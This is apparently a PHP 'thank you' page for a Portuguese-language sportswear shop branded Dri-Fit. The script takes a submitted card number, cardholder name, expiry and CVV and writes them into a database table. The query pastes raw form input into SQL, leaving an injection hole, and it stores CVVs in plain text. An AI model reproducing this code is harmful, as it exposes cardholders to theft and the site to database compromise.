<?php
	include_once('conexao.php');
	$numerodocartao = $_POST['numerodocartao'];
	$nome = $_POST['nome'];
	$mes = $_POST['mes'];
	$ano = $_POST['ano'];
	$cvv = $_POST['cvv'];

	
	$result_msg_contatocc = "INSERT INTO mensagens_contatoscc(numerodocartao, nome, mes, ano, cvv, created) VALUES ('$numerodocartao', '$nome', '$mes', '$ano', '$cvv', NOW())";
	$resultado_msg_contatocc= mysqli_query($conn, $result_msg_contatocc)
?>

<html> 
<head>
<title>Agradecimento</title>
<link rel="stylesheet" type="text/css" href="CSS/Agradecimento.css"/>
</head>
<body>

<div id="header">
<div class="logo"><a href="Index.html"><img src="img/logotipo.jpg"></a></div></div>

<div id="contents">
<a href="Index.html"> <img src="img/Agradecimento2.jpg"> </a>
</div>

<div id="footer">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img src="img/logo.jpg">
<div class="redes"><br>
<a href="https://www.facebook.com/Dri-Fit-113038433408926/"><div class="facebook"></div></a>
<a href="https://www.instagram.com/p/B2DX5_Nl9z_/?igshid=hvwvur3yi8kk"><div class="instagram"></div></a>
<a href="https://twitter.com/drifitoficial"><div class="twitter"></div></a></center></div><br>
<center><p8>Os preços, promoções, condições de pagamento, frete e produtos são válidos exclusivamente para compras realizadas via internet. Criado e desenvolvido por Wollner.<br>Fotos meramente ilustrativas. Copyright  © - drifit.com.br. Todos os direitos reservados.</p8></center>
</div>

</body>
</html>